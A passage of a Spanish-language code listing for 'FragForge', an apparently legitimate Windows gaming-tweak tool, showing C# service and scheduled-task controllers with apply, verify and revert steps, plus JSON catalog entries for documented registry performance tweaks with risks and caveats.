        if (_parameters.StartMode is not null || _parameters.DelayedAutoStart is not null) await _controller.SetStartModeAsync(_parameters.Name, _parameters.StartMode ?? "Manual", _parameters.DelayedAutoStart, cancellationToken);
        if (_parameters.State is not null) await _controller.SetStateAsync(_parameters.Name, _parameters.State, cancellationToken);
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var current = await _controller.GetAsync(_parameters.Name, cancellationToken);
        var ok = (_parameters.StartMode is null || current.StartMode == _parameters.StartMode) && (_parameters.State is null || current.State == _parameters.State) && (_parameters.DelayedAutoStart is null || current.DelayedAutoStart == _parameters.DelayedAutoStart);
        return ok ? VerificationResult.Match($"Servicio {_parameters.Name}: {current.StartMode}/{current.State}.") : VerificationResult.Missing($"Servicio {_parameters.Name} no coincide.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var state = (ServiceActionState)before;
        if (!state.Service.Exists) throw new InvalidOperationException("Cannot revert a service that did not exist at capture.");
        _policy.EnsureServiceAllowed(state.Service.Name);
        await _controller.SetStartModeAsync(state.Service.Name, state.Service.StartMode ?? "Manual", _parameters.DelayedAutoStart is null ? null : state.Service.DelayedAutoStart, cancellationToken, !state.Service.DelayedAutoStartExisted);
        await _controller.SetStateAsync(state.Service.Name, state.Service.State ?? "Stopped", cancellationToken);
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Core.Engine.ActionStateEquivalence.Equivalent(before, await CaptureAsync(context, cancellationToken)) ? VerificationResult.Match("Servicio restaurado.") : VerificationResult.Missing("El servicio no volvió al estado capturado.");
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult($"Servicio {_parameters.Name}: inicio={_parameters.StartMode ?? "sin cambio"}, estado={_parameters.State ?? "sin cambio"}, delayed={_parameters.DelayedAutoStart?.ToString() ?? "sin cambio"}. Revert restaura inicio y estado exactos.");
}
internal sealed record ServiceParameters { public required string Name { get; init; } public string? StartMode { get; init; } public string? State { get; init; } public bool? DelayedAutoStart { get; init; } }
````

### `src/FragForge.Actions/Services/WindowsServiceController.cs`  <sub>(56 líneas)</sub>

````csharp
using System.Management;
using System.Runtime.Versioning;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Services;

[SupportedOSPlatform("windows")]
public sealed class WindowsServiceController(IRegistry registry) : IServiceController
{
    private const string ServicesKey = @"HKLM\SYSTEM\CurrentControlSet\Services";
    public Task<ServiceCapture> GetAsync(string name, CancellationToken cancellationToken = default) => Task.Run(async () =>
    {
        cancellationToken.ThrowIfCancellationRequested();
        using var searcher = new ManagementObjectSearcher(new ManagementScope(@"root\cimv2"), new ObjectQuery($"SELECT Name,StartMode,State FROM Win32_Service WHERE Name='{Escape(name)}'"), new System.Management.EnumerationOptions { Timeout = TimeSpan.FromSeconds(15) });
        using var results = searcher.Get();
        using var service = results.Cast<ManagementObject>().FirstOrDefault();
        if (service is null) return new ServiceCapture { Name = name, Exists = false };
        var delayed = await registry.ReadValueAsync(ServicesKey + "\\" + name, "DelayedAutostart", cancellationToken);
        return new ServiceCapture { Name = name, Exists = true, StartMode = service["StartMode"] as string, State = service["State"] as string, DelayedAutoStart = delayed.ValueExists ? Convert.ToInt32(delayed.Data) != 0 : false, DelayedAutoStartExisted = delayed.ValueExists };
    }, cancellationToken);
    public Task SetStartModeAsync(string name, string startMode, bool? delayedAutoStart, CancellationToken cancellationToken = default, bool restoreAbsentDelayed = false) => Task.Run(async () =>
    {
        cancellationToken.ThrowIfCancellationRequested();
        using var service = Find(name);
        using var parameters = service.GetMethodParameters("ChangeStartMode");
        parameters["StartMode"] = startMode switch { "Auto" => "Automatic", "Manual" => "Manual", "Disabled" => "Disabled", _ => throw new ArgumentException("Invalid start mode.") };
        using var result = service.InvokeMethod("ChangeStartMode", parameters, null);
        var code = Convert.ToUInt32(result["ReturnValue"]);
        if (code != 0) throw new FragForgeException("service_change_failed", $"ChangeStartMode({name}) devolvió {code}.");
        if (delayedAutoStart is not null)
        {
            var key = ServicesKey + "\\" + name;
            if (restoreAbsentDelayed) await registry.DeleteValueAsync(key, "DelayedAutostart", cancellationToken);
            else await registry.WriteValueAsync(key, "DelayedAutostart", new RegistryWriteValue("DWord", delayedAutoStart.Value ? 1 : 0), cancellationToken);
        }
    }, cancellationToken);
    public Task SetStateAsync(string name, string state, CancellationToken cancellationToken = default) => Task.Run(async () =>
    {
        cancellationToken.ThrowIfCancellationRequested();
        using var service = Find(name);
        var current = service["State"] as string;
        if (string.Equals(current, state, StringComparison.OrdinalIgnoreCase)) return;
        var method = state switch { "Running" => "StartService", "Stopped" => "StopService", _ => throw new ArgumentException("Invalid service state.") };
        using var result = service.InvokeMethod(method, null, null);
        var code = Convert.ToUInt32(result["ReturnValue"]);
        if (code is not (0 or 10)) throw new FragForgeException("service_state_failed", $"{method}({name}) devolvió {code}.");
    }, cancellationToken);
    private static ManagementObject Find(string name)
    {
        using var searcher = new ManagementObjectSearcher(new ManagementScope(@"root\cimv2"), new ObjectQuery($"SELECT * FROM Win32_Service WHERE Name='{Escape(name)}'"), new System.Management.EnumerationOptions { Timeout = TimeSpan.FromSeconds(15) });
        using var results = searcher.Get();
        return results.Cast<ManagementObject>().FirstOrDefault() ?? throw new ActionNotApplicableException($"El servicio {name} no existe.");
    }
    private static string Escape(string value) => value.Replace("\\", "\\\\").Replace("'", "\\'");
}
````

### `src/FragForge.Actions/Tasks/ScheduledTaskAction.cs`  <sub>(33 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Tasks;

public sealed class ScheduledTaskAction(IScheduledTaskStore store, IProtectionPolicy policy, ActionSpec specification) : ITweakAction
{
    private readonly ScheduledTaskParameters _parameters = ActionParameters.Parse<ScheduledTaskParameters>(specification);
    public string Kind => "ScheduledTask";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        policy.EnsureTaskAllowed(_parameters.Path);
        if (!_parameters.Path.StartsWith('\\') || _parameters.Path.Contains("..")) throw new CatalogValidationException("Scheduled task path must be absolute and safe.", [_parameters.Path]);
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        policy.EnsureTaskAllowed(_parameters.Path);
        var state = await store.GetAsync(_parameters.Path, cancellationToken);
        if (!state.Exists) throw new ActionNotApplicableException($"La tarea {_parameters.Path} no existe.");
        return state;
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) { policy.EnsureTaskAllowed(_parameters.Path); await store.SetEnabledAsync(_parameters.Path, _parameters.Enabled, cancellationToken); }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var current = await store.GetAsync(_parameters.Path, cancellationToken);
        return current.Exists && current.Enabled == _parameters.Enabled ? VerificationResult.Match($"Tarea {_parameters.Path} enabled={current.Enabled}.") : VerificationResult.Missing("La tarea programada no coincide.");
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) { var state = (ScheduledTaskActionState)before; policy.EnsureTaskAllowed(state.Path); await store.SetEnabledAsync(state.Path, state.Enabled, cancellationToken); }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default) => Core.Engine.ActionStateEquivalence.Equivalent(before, await CaptureAsync(context, cancellationToken)) ? VerificationResult.Match("Tarea restaurada.") : VerificationResult.Missing("La tarea no volvió al estado capturado.");
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => Task.FromResult($"Tarea {_parameters.Path}: Enabled={_parameters.Enabled}; no se elimina ni se reescribe su XML.");
}
internal sealed record ScheduledTaskParameters { public required string Path { get; init; } public bool Enabled { get; init; } }
````

### `src/FragForge.Actions/Tasks/WindowsScheduledTaskStore.cs`  <sub>(42 líneas)</sub>

````csharp
using System.Runtime.Versioning;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Tasks;

[SupportedOSPlatform("windows")]
public sealed class WindowsScheduledTaskStore(IProcessRunner runner) : IScheduledTaskStore
{
    public async Task<ScheduledTaskActionState> GetAsync(string path, CancellationToken cancellationToken = default)
    {
        var (folder, name) = Split(path);
        var script = "$ErrorActionPreference='Stop'; [Console]::OutputEncoding=[System.Text.UTF8Encoding]::new(); " +
            $"$t=Get-ScheduledTask -TaskPath '{Escape(folder)}' -TaskName '{Escape(name)}' -ErrorAction SilentlyContinue; " +
            "if ($null -eq $t) { '{\"exists\":false}' } else { [pscustomobject]@{exists=$true; enabled=[bool]$t.Settings.Enabled; xml=(Export-ScheduledTask -TaskPath $t.TaskPath -TaskName $t.TaskName)} | ConvertTo-Json -Compress -Depth 4 }";
        var result = await RunAsync(script, cancellationToken);
        using var document = JsonDocument.Parse(result.StandardOutput.TrimStart('\uFEFF'));
        var root = document.RootElement;
        return new ScheduledTaskActionState { Path = path, Exists = root.GetProperty("exists").GetBoolean(), Enabled = root.TryGetProperty("enabled", out var e) && e.GetBoolean(), XmlDefinition = root.TryGetProperty("xml", out var x) ? x.GetString() : null };
    }
    public async Task SetEnabledAsync(string path, bool enabled, CancellationToken cancellationToken = default)
    {
        var (folder, name) = Split(path);
        var cmdlet = enabled ? "Enable-ScheduledTask" : "Disable-ScheduledTask";
        await RunAsync($"$ErrorActionPreference='Stop'; {cmdlet} -TaskPath '{Escape(folder)}' -TaskName '{Escape(name)}' -Confirm:$false | Out-Null", cancellationToken);
    }
    private async Task<ProcessResult> RunAsync(string script, CancellationToken cancellationToken)
    {
        var result = await runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable(@"WindowsPowerShell\v1.0\powershell.exe"), Arguments = ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script], Timeout = TimeSpan.FromSeconds(60) }, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("powershell.exe", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError);
        return result;
    }
    private static (string Folder, string Name) Split(string path)
    {
        var normalized = path.Replace('/', '\\');
        var index = normalized.LastIndexOf('\\');
        if (index <= 0 || index == normalized.Length - 1) throw new ArgumentException("Invalid scheduled task path.");
        return (normalized[..(index + 1)], normalized[(index + 1)..]);
    }
    private static string Escape(string value) => value.Replace("'", "''");
}
````

---

## 3c. FragForge.Tweaks — catálogo, esquema, localización y validadores

### `src/FragForge.Tweaks/Catalog/Cpu/cpu.power-throttling-off.json`  <sub>(73 líneas)</sub>

````json
{
  "id": "cpu.power-throttling-off",
  "category": "Cpu",
  "title": {
    "es-MX": "Desactivar Power Throttling global",
    "en-US": "Disable global Power Throttling"
  },
  "description": {
    "es-MX": "Aplica la política documentada PowerThrottlingOff=1 en sistemas con CPU híbrida confirmada.",
    "en-US": "Applies the documented PowerThrottlingOff=1 policy on systems with a confirmed hybrid CPU."
  },
  "evidence": "Medium",
  "risk": "Moderate",
  "requiresReboot": true,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "hybridCpu",
      "parameters": {
        "expected": true
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerThrottling",
            "name": "PowerThrottlingOff",
            "kind": "DWord",
            "value": 1,
            "mode": "Set"
          }
        ]
      }
    }
  ],
  "tags": [
    "cpu",
    "thermal-opt-in"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Bajo/variable",
    "1%lows": "Posible reducción de throttling de fondo; no garantizado",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "Peor: más consumo y temperatura"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-power#powerthrottlingturnoff"
  ],
  "notes": {
    "es-MX": "El i3-1220P es híbrido, pero solo se aplica si EfficiencyClass lo confirma. En un mini PC de 28 W, DTT/IPF sigue gobernando límites térmicos; desactivar throttling puede aumentar temperatura y reducir boost sostenido.",
    "en-US": "The i3-1220P is hybrid, but this only applies if EfficiencyClass confirms it. On a 28 W mini PC, DTT/IPF still owns thermal limits; disabling throttling can raise temperature and reduce sustained boost."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si el equipo ya alcanza límites térmicos, el ventilador es insuficiente o priorizas silencio/consumo. Medir temperatura y 1% lows antes/después.",
    "en-US": "Do not apply if the system already hits thermal limits, cooling is insufficient, or silence/power matter more. Measure temperature and 1% lows before/after."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Cs2/cs2.cpu-priority-high.json`  <sub>(61 líneas)</sub>

````json
{
  "id": "cs2.cpu-priority-high",
  "category": "Cs2",
  "title": {
    "es-MX": "Prioridad alta de CPU para cs2.exe",
    "en-US": "High CPU priority for cs2.exe"
  },
  "description": {
    "es-MX": "Configura IFEO PerfOptions CpuPriorityClass=3 (High) para el nombre de imagen cs2.exe.",
    "en-US": "Configures IFEO PerfOptions CpuPriorityClass=3 (High) for the cs2.exe image name."
  },
  "evidence": "Medium",
  "risk": "Moderate",
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    }
  ],
  "actions": [
    {
      "kind": "IfeoPerfOptions",
      "parameters": {
        "imageName": "cs2.exe",
        "priorityClass": 3
      }
    }
  ],
  "tags": [
    "competitive",
    "scheduler"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Moderado/variable",
    "1%lows": "Posible mejora si hay competencia de CPU",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/previous-versions/windows/desktop/xperf/image-file-execution-options",
    "https://learn.microsoft.com/en-us/windows/win32/procthread/scheduling-priorities"
  ],
  "notes": {
    "es-MX": "No usa Realtime ni afinidad. No inyecta código ni lee memoria de cs2.exe. Puede perjudicar audio, Discord o procesos de fondo si compiten por CPU.",
    "en-US": "Does not use Realtime or affinity. Does not inject code or read cs2.exe memory. May hurt audio, Discord or background processes competing for CPU."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si causa audio entrecortado, peor frametime o inestabilidad. Reiniciar el juego después de aplicar/revertir.",
    "en-US": "Do not apply if it causes crackling audio, worse frametime or instability. Restart the game after apply/revert."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Cs2/cs2.fullscreen-optimizations-off.json`  <sub>(81 líneas)</sub>

````json
{
  "id": "cs2.fullscreen-optimizations-off",
  "category": "Cs2",
  "title": {
    "es-MX": "Desactivar Fullscreen Optimizations para CS2",
    "en-US": "Disable Fullscreen Optimizations for CS2"
  },
  "description": {
    "es-MX": "Añade DISABLEDXMAXIMIZEDWINDOWEDMODE a AppCompatFlags/Layers para la ruta real de cs2.exe, conservando otros flags.",
    "en-US": "Adds DISABLEDXMAXIMIZEDWINDOWEDMODE to AppCompatFlags/Layers for the actual cs2.exe path, preserving other flags."
  },
  "evidence": "Experimental",
  "risk": "Experimental",
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "userHive",
      "parameters": {
        "expected": true
      }
    },
    {
      "type": "cs2",
      "parameters": {
        "installed": true
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
            "name": "{Cs2Executable}",
            "kind": "String",
            "value": "DISABLEDXMAXIMIZEDWINDOWEDMODE",
            "mode": "AddToken"
          }
        ]
      }
    }
  ],
  "tags": [
    "opt-in",
    "display",
    "measure-ab"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Desconocido; depende del modo de presentación",
    "1%lows": "Experimental",
    "inputLatency": "Experimental",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/direct3ddxgi/flip-model",
    "https://devblogs.microsoft.com/directx/dxgi-flip-model/"
  ],
  "notes": {
    "es-MX": "El efecto depende de fullscreen exclusivo, ventana sin bordes, flip model y controlador Intel. No es una mejora garantizada. Requiere perfil Advanced y doble confirmación; reiniciar el juego, no Windows.",
    "en-US": "Effect depends on exclusive fullscreen, borderless window, flip model and the Intel driver. Not a guaranteed improvement. Requires Advanced profile and double confirmation; restart the game, not Windows."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si usas ventana sin bordes y el frametime ya es estable, o si empeora alt-tab/overlays. Detectar ruta por Steam o seleccionarla manualmente.",
    "en-US": "Do not apply if borderless frametime is already stable, or if alt-tab/overlays worsen. Detect the path through Steam or select it manually."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Diagnostics/diagnostics.system-inspect.json`  <sub>(69 líneas)</sub>

````json
{
  "id": "diagnostics.system-inspect",
  "category": "Diagnostics",
  "title": {
    "es-MX": "Inspección de sistema de solo lectura",
    "en-US": "Read-only system inspection"
  },
  "description": {
    "es-MX": "Reporta HAGS, MPO, VBS/HVCI, Secure Boot, canales de RAM, PL1/PL2 y salud básica del SSD sin escribir.",
    "en-US": "Reports HAGS, MPO, VBS/HVCI, Secure Boot, RAM channels, PL1/PL2 and basic SSD health without writing."
  },
  "evidence": "High",
  "risk": "Safe",
  "requiresReboot": false,
  "requiresAdmin": false,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    }
  ],
  "actions": [
    {
      "kind": "InspectOnly",
      "parameters": {
        "probes": [
          "hags",
          "mpo",
          "vbs",
          "hvci",
          "secureBoot",
          "dualChannel",
          "powerLimits",
          "ssdHealth"
        ]
      }
    }
  ],
  "tags": [
    "diagnostic",
    "read-only"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "None",
    "1%lows": "None",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows-hardware/drivers/display/hardware-accelerated-gpu-scheduling",
    "https://learn.microsoft.com/en-us/windows/win32/sr/system-restore-wmi-classes"
  ],
  "notes": {
    "es-MX": "Unknown significa que no hay prueba suficiente, no que esté desactivado. Esta acción alimenta la línea base de Capa 1; Apply y Revert no realizan cambios.",
    "en-US": "Unknown means insufficient evidence, not disabled. This action feeds the Layer 1 baseline; Apply and Revert make no changes."
  },
  "whenNotToApply": {
    "es-MX": "No hay riesgo de cambio; puede ejecutarse siempre que WMI/registro estén disponibles.",
    "en-US": "There is no mutation risk; run whenever WMI/registry are available."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Latency/latency.game-dvr-capture-off.json`  <sub>(87 líneas)</sub>

````json
{
  "id": "latency.game-dvr-capture-off",
  "category": "Latency",
  "title": {
    "es-MX": "Desactivar captura Game DVR en segundo plano",
    "en-US": "Disable background Game DVR capture"
  },
  "description": {
    "es-MX": "Desactiva AppCaptureEnabled, GameDVR_Enabled y la política AllowGameDVR sin desinstalar Xbox Game Bar.",
    "en-US": "Disables AppCaptureEnabled, GameDVR_Enabled and the AllowGameDVR policy without uninstalling Xbox Game Bar."
  },
  "evidence": "High",
  "risk": "Moderate",
  "requiresReboot": true,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "userHive",
      "parameters": {
        "expected": true
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\GameDVR",
            "name": "AppCaptureEnabled",
            "kind": "DWord",
            "value": 0,
            "mode": "Set"
          },
          {
            "key": "HKCU\\System\\GameConfigStore",
            "name": "GameDVR_Enabled",
            "kind": "DWord",
            "value": 0,
            "mode": "Set"
          },
          {
            "key": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR",
            "name": "AllowGameDVR",
            "kind": "DWord",
            "value": 0,
            "mode": "Set"
          }
        ]
      }
    }
  ],
  "tags": [
    "capture",
    "background"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Variable; puede reducir trabajo de captura si estaba activo",
    "1%lows": "Posible mejora modesta si había captura en segundo plano",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-applicationmanagement#allowgamedvr"
  ],
  "notes": {
    "es-MX": "La política bloquea grabación/retransmisión de Windows. Game Bar no se desinstala, pero sus funciones de captura quedan deshabilitadas. No toca Defender, Firewall ni Update.",
    "en-US": "The policy blocks Windows recording/broadcasting. Game Bar is not uninstalled, but its capture features are disabled. Defender, Firewall and Update are untouched."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si usas Game Bar para clips, grabación o streaming. Si ya está desactivado por Atlas, se marcará AppliedExternally y no se sobrescribirá.",
    "en-US": "Do not apply if you use Game Bar for clips, recording or streaming. If Atlas already disabled it, it is marked AppliedExternally and not overwritten."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Latency/latency.game-mode-on.json`  <sub>(79 líneas)</sub>

````json
{
  "id": "latency.game-mode-on",
  "category": "Latency",
  "title": {
    "es-MX": "Activar Modo de juego de Windows",
    "en-US": "Enable Windows Game Mode"
  },
  "description": {
    "es-MX": "Activa AutoGameModeEnabled y AllowAutoGameMode para el usuario interactivo.",
    "en-US": "Enables AutoGameModeEnabled and AllowAutoGameMode for the interactive user."
  },
  "evidence": "Medium",
  "risk": "Safe",
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "userHive",
      "parameters": {
        "expected": true
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKCU\\Software\\Microsoft\\GameBar",
            "name": "AutoGameModeEnabled",
            "kind": "DWord",
            "value": 1,
            "mode": "Set"
          },
          {
            "key": "HKCU\\Software\\Microsoft\\GameBar",
            "name": "AllowAutoGameMode",
            "kind": "DWord",
            "value": 1,
            "mode": "Set"
          }
        ]
      }
    }
  ],
  "tags": [
    "scheduling"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Variable, generalmente pequeño",
    "1%lows": "Posible mejora de consistencia en equipos con carga de fondo",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://support.xbox.com/es-ES/help/games-apps/game-setup-and-play/use-game-mode-for-best-gaming-experience"
  ],
  "notes": {
    "es-MX": "Game Mode prioriza el juego frente a tareas de fondo; no es un multiplicador de FPS. El beneficio depende de la carga y del reconocimiento del juego.",
    "en-US": "Game Mode prioritizes the game over background work; it is not an FPS multiplier. Benefit depends on load and game recognition."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si una prueba A/B muestra peor frametime o si una herramienta de gestión ya fuerza otra política equivalente.",
    "en-US": "Do not apply if an A/B test shows worse frametime or another management tool already enforces an equivalent policy."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Latency/latency.global-timer-resolution.json`  <sub>(68 líneas)</sub>

````json
{
  "id": "latency.global-timer-resolution",
  "category": "Latency",
  "title": {
    "es-MX": "Solicitudes globales de resolución de timer",
    "en-US": "Global timer resolution requests"
  },
  "description": {
    "es-MX": "Establece GlobalTimerResolutionRequests=1 para solicitar el comportamiento global previo a Windows 10 2004.",
    "en-US": "Sets GlobalTimerResolutionRequests=1 to request the pre-Windows 10 2004 global behavior."
  },
  "evidence": "Medium",
  "risk": "Moderate",
  "requiresReboot": true,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
            "name": "GlobalTimerResolutionRequests",
            "kind": "DWord",
            "value": 1,
            "mode": "Set"
          }
        ]
      }
    }
  ],
  "tags": [
    "timer",
    "measure-ab"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "None",
    "1%lows": "No garantizado",
    "inputLatency": "Variable; puede afectar esperas/temporización",
    "network": "None",
    "boot": "None",
    "thermals": "Peor: posible mayor consumo"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/api/timeapi/nf-timeapi-timebeginperiod",
    "https://learn.microsoft.com/en-us/windows/win32/directshow/ireferenceclocktimercontrol"
  ],
  "notes": {
    "es-MX": "La documentación oficial describe timeBeginPeriod y el cambio de Windows 10 2004/Windows 11; esta clave concreta no está documentada como contrato público. Evidence Medium se refiere al mecanismo del timer, no a una ganancia probada en CS2. Puede aumentar interrupciones/consumo.",
    "en-US": "Official docs describe timeBeginPeriod and the Windows 10 2004/Windows 11 change; this specific value is not a documented public contract. Medium evidence refers to the timer mechanism, not a proven CS2 gain. It may increase interrupts/power."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar sin línea base A/B. Evitar si aumenta temperatura, consumo o DPC/ISR, o si el juego ya solicita resolución adecuada.",
    "en-US": "Do not apply without an A/B baseline. Avoid if temperature, power or DPC/ISR rise, or if the game already requests an adequate resolution."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Latency/latency.mouse-acceleration-off.json`  <sub>(102 líneas)</sub>

````json
{
  "id": "latency.mouse-acceleration-off",
  "category": "Latency",
  "title": {
    "es-MX": "Desactivar aceleración del mouse del escritorio",
    "en-US": "Disable desktop mouse acceleration"
  },
  "description": {
    "es-MX": "Establece MouseSpeed y umbrales en 0 y curvas lineales 1:1 en el hive del usuario interactivo.",
    "en-US": "Sets MouseSpeed and thresholds to 0 and linear 1:1 curves in the interactive user hive."
  },
  "evidence": "High",
  "risk": "Safe",
  "requiresReboot": true,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "userHive",
      "parameters": {
        "expected": true
      }
    }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          {
            "key": "HKCU\\Control Panel\\Mouse",
            "name": "MouseSpeed",
            "kind": "String",
            "value": "0",
            "mode": "Set"
          },
          {
            "key": "HKCU\\Control Panel\\Mouse",
            "name": "MouseThreshold1",
            "kind": "String",
            "value": "0",
            "mode": "Set"
          },
          {
            "key": "HKCU\\Control Panel\\Mouse",
            "name": "MouseThreshold2",
            "kind": "String",
            "value": "0",
            "mode": "Set"
          },
          {
            "key": "HKCU\\Control Panel\\Mouse",
            "name": "SmoothMouseXCurve",
            "kind": "Binary",
            "value": "AAAAAAAAAAAAAAEAAAAAAAAAAgAAAAAAAAADAAAAAAAAAAQAAAAAAA==",
            "mode": "Set"
          },
          {
            "key": "HKCU\\Control Panel\\Mouse",
            "name": "SmoothMouseYCurve",
            "kind": "Binary",
            "value": "AAAAAAAAAAAAAAEAAAAAAAAAAgAAAAAAAAADAAAAAAAAAAQAAAAAAA==",
            "mode": "Set"
          }
        ]
      }
    }
  ],
  "tags": [
    "input",
    "desktop-wide"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "None",
    "1%lows": "None",
    "inputLatency": "Consistencia del puntero; no garantiza menor latencia en CS2 con raw input",
    "network": "None",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-systemparametersinfoa",
    "https://fleexlab.blogspot.com/2020/08/setting-arbitrarily-precise-mouse.html"
  ],
  "notes": {
    "es-MX": "Afecta a todo el escritorio y a aplicaciones que usan el puntero de Windows. CS2 puede usar raw input y no verse afectado. Los cambios de registro requieren cerrar sesión/reiniciar; no se inyecta ni se modifica cs2.exe.",
    "en-US": "Affects the entire desktop and applications using the Windows pointer. CS2 may use raw input and be unaffected. Registry changes require sign-out/reboot; cs2.exe is not injected or modified."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si dependes de Precisión mejorada del puntero o de una curva personalizada. Guarda tu configuración actual; la reversión restaura bytes exactos.",
    "en-US": "Do not apply if you rely on Enhance pointer precision or a custom curve. The revert restores exact bytes."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Network/network.i225v-eee-off.json`  <sub>(76 líneas)</sub>

````json
{
  "id": "network.i225v-eee-off",
  "category": "Network",
  "title": {
    "es-MX": "Desactivar EEE en Intel I225-V",
    "en-US": "Disable EEE on Intel I225-V"
  },
  "description": {
    "es-MX": "Desactiva la propiedad avanzada Energy Efficient Ethernet (*EEE) si el controlador la expone exactamente.",
    "en-US": "Disables the Energy Efficient Ethernet (*EEE) advanced property if the driver exposes it exactly."
  },
  "evidence": "Medium",
  "risk": "Moderate",
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [
    {
